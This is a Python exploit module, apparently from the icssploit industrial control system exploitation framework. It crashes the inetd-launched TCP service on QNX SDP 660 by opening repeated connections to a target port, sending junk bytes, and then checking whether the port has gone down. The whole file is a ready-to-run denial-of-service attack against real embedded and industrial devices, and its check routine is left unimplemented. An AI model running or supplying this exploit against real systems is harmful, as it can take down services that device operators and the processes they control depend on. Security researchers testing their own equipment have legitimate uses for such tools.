from icssploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    mute,
    validators,
)
import socket
import time


class Exploit(exploits.Exploit):
    __info__ = {
        'name': 'Crash QNX Inetd tcp service',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>',
        ],
        'description': 'Crash the tcp service started with inetd.',
        'references': [
            'https://gist.github.com/dark-lbp/e26c4493b687ea9b345f46e002e4d9a8'
        ],
        'devices': [
            'QNX SDP 660',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
    port = exploits.Option(22, 'Target Port', validators=validators.integer)

    def exploit(self):
        for i in range(60):
            try:
                sock = socket.socket()
                sock.connect((self.target, self.port))
                sock.send('A' * 100)
                time.sleep(0.1)
            except Exception:
                break

    def run(self):
        if self._check_alive():
            print_success("Target is alive")
            print_status("Sending packet to target")
            self.exploit()
            if not self._check_alive():
                print_success("Target port is down")
        else:
            print_error("Target port is not alive")

    @mute
    # TODO: Add check later
    def check(self):
        pass

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception:
            return False
        return True

